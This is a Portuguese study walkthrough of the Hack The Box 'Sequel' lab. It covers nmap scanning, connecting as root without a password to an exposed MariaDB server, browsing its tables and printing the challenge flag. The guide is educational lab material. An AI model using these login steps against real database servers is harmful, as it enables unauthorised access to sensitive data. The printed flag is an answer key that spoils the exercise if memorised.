# Guia de Resolução: Hack The Box - Sequel

Este documento é um guia de estudo para o desafio "Sequel". Ele se concentra na enumeração e interação direta com um servidor de banco de dados MySQL/MariaDB que está exposto na rede e permite acesso sem senha para o usuário `root`. O objetivo é explicar não apenas *como* realizar a exploração, mas *por que* cada comando SQL funciona, detalhando a navegação dentro do banco de dados para encontrar a flag.

---

## Introdução: Navegação em Bancos de Dados SQL

Bancos de dados como MySQL e MariaDB são sistemas de gerenciamento de banco de dados relacionais (RDBMS) amplamente utilizados para armazenar e organizar dados. Esses dados são estruturados em:

*   **Bancos de Dados (Databases):** Contêineres lógicos para agrupar tabelas relacionadas.
*   **Tabelas (Tables):** Estruturas que contêm os dados reais, organizados em linhas e colunas.
*   **Colunas (Columns):** Definem os atributos ou tipos de dados que cada entrada na tabela pode ter (ex: nome, email, senha).
*   **Linhas (Rows):** Representam os registros individuais dentro de uma tabela.

A capacidade de se conectar a um servidor de banco de dados e navegar por sua estrutura é uma habilidade fundamental em testes de invasão, pois bancos de dados frequentemente contêm informações sensíveis, incluindo credenciais e dados de usuários.

---

## Fase 1: Reconhecimento Inicial e Identificação do Serviço de Banco de Dados

O primeiro passo é identificar os serviços em execução no alvo, com foco especial em portas de banco de dados conhecidas.

### 1. Explicação Didática

> Imagine que você está se aproximando de um prédio seguro. Primeiro, você verifica quais portas estão acessíveis e que tipo de fechadura elas têm. Se você encontrar uma porta que parece ser a entrada para a sala de cofres (o servidor de banco de dados), essa se torna seu foco principal.

### 2. Explicação Técnica (Passo a Passo)

1.  **Enumeração de Portas e Serviços:** Utilizamos o `nmap` para descobrir os serviços ativos.

    *   **Comando:**
        ```bash
        sudo nmap -sC -sV {IP_DO_ALVO}
        ```
    *   **Explicação dos Parâmetros:**
        *   `sudo`: Necessário para scripts e detecção de versão que podem exigir privilégios.
        *   `nmap`: A ferramenta de varredura.
        *   `-sC`: Executa scripts de enumeração padrão. Para MySQL/MariaDB, isso pode tentar coletar informações como versão, plugins de autenticação, etc.
        *   `-sV`: Tenta identificar a versão do serviço.
        *   `{IP_DO_ALVO}`: O endereço IP da máquina "Sequel".

    *   **Resultado:** O `nmap` identifica a porta `3306/tcp` aberta, rodando `MySQL 5.5.5-10.3.27-MariaDB-0+deb10u1`. A porta 3306 é a porta padrão para MySQL e MariaDB. O script `mysql-info` também retorna detalhes como o protocolo, ID da thread, e o nome do plugin de autenticação (`mysql_native_password`).

---

## Vulnerabilidade 1: Acesso ao Banco de Dados MySQL/MariaDB com Credenciais Fracas (root sem senha)

A principal vulnerabilidade é a configuração do servidor MariaDB que permite ao usuário `root` (o superusuário do banco de dados) conectar-se remotamente sem fornecer uma senha.

### 1. Dica do Desafio

<details>
  <summary>Clique para revelar a dica</summary>
  <p>A presença de um serviço de banco de dados como MySQL/MariaDB em uma máquina de CTF introdutória frequentemente sugere credenciais fracas ou acesso anônimo/sem senha, especialmente para usuários privilegiados como `root`.</p>
</details>

### 2. Explicação Didática

> Pense no servidor MariaDB como a sala de controle principal de um sistema. O usuário `root` é o administrador com a chave mestra. Nesta máquina, o administrador deixou a porta da sala de controle destrancada e a chave mestra na fechadura, permitindo que qualquer um que saiba o nome "root" entre e assuma o controle.

Permitir que o usuário `root` do MySQL/MariaDB se conecte sem senha, especialmente de hosts remotos, é uma falha de segurança grave.

### 3. Explicação Técnica (Passo a Passo)

1.  **Instalação do Cliente MySQL/MariaDB (se necessário):** Para interagir com o servidor, precisamos de um cliente.

    *   **Comando:**
        ```bash
        sudo apt update && sudo apt install mysql*
        ```
    *   **Explicação dos Parâmetros:**
        *   `sudo apt update`: Atualiza a lista de pacotes.
        *   `sudo apt install mysql*`: Instala o cliente MySQL/MariaDB e pacotes relacionados. O `*` é um curinga para garantir que todos os componentes necessários sejam instalados.

2.  **Tentativa de Conexão como `root` sem Senha:** Usamos o cliente `mysql` para tentar conectar ao servidor como usuário `root`, sem fornecer uma senha.

    *   **Comando:**
        ```bash
        mysql -h {IP_DO_ALVO} -u root
        ```
    *   **Explicação dos Parâmetros:**
        *   `mysql`: O programa cliente para MySQL/MariaDB.
        *   `-h {IP_DO_ALVO}`: Especifica o host (endereço IP) do servidor ao qual queremos nos conectar.
        *   `-u root`: Especifica o nome de usuário para a conexão. Estamos tentando como `root`.
        *   **Nota sobre a senha:** Não usamos o parâmetro `-p`. Se uma senha fosse necessária, o cliente solicitaria. Ao omiti-lo e não sermos solicitados, isso implica que o servidor permite login sem senha para este usuário a partir do nosso host.

    *   **Resultado:** Se a conexão for bem-sucedida, seremos saudados com o prompt do MariaDB: `MariaDB [(none)]>`. O `(none)` indica que nenhum banco de dados foi selecionado por padrão.

3.  **Navegação e Exploração do Banco de Dados:** Uma vez conectados, podemos usar comandos SQL para explorar o servidor. Todos os comandos SQL devem terminar com um ponto e vírgula (`;`).

    *   **Listar todos os bancos de dados disponíveis:**
        ```sql
        MariaDB [(none)]> SHOW DATABASES;
        ```
        *   **Saída:**
            ```
            +--------------------+
            | Database           |
            +--------------------+
            | htb                |
            | information_schema |
            | mysql              |
            | performance_schema |
            +--------------------+
            ```
        O banco de dados `htb` parece ser o mais interessante e específico do desafio.

    *   **Selecionar o banco de dados `htb`:**
        ```sql
        MariaDB [htb]> USE htb;
        ```
        *   **Saída:** `Database changed`. O prompt muda para `MariaDB [htb]>`, indicando que agora estamos operando dentro do banco de dados `htb`.

    *   **Listar tabelas no banco de dados `htb`:**
        ```sql
        MariaDB [htb]> SHOW TABLES;
        ```
        *   **Saída:**
            ```
            +---------------+
            | Tables_in_htb |
            +---------------+
            | config        |
            | users         |
            +---------------+
            ```
        Temos duas tabelas: `config` e `users`.

    *   **Extrair dados da tabela `config`:** A tabela `config` parece um bom lugar para procurar informações de configuração ou flags.
        ```sql
        MariaDB [htb]> SELECT * FROM config;
        ```
        *   **Explicação do Comando:**
            *   `SELECT *`: Seleciona todas as colunas.
            *   `FROM config`: Da tabela chamada `config`.
        *   **Saída (parcial, focando na flag):**
            ```
            +----+-----------------------+----------------------------------+
            | id | name                  | value                            |
            +----+-----------------------+----------------------------------+
            ...
            | 5  | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
            ...
            +----+-----------------------+----------------------------------+
            ```
        A flag é encontrada na linha onde a coluna `name` é `flag`, e seu valor está na coluna `value`.

4.  **Sair do Cliente MySQL/MariaDB:**

    *   **Comando:**
        ```sql
        MariaDB [htb]> exit;
        ```
    *   Isso encerra a sessão com o servidor.

---

Com a flag `7b4bec00d1a39e3dd4e021ec3d915da8` recuperada da tabela `config`, o desafio "Sequel" está completo. Este exercício destaca a importância de proteger o acesso a servidores de banco de dados, especialmente para contas privilegiadas.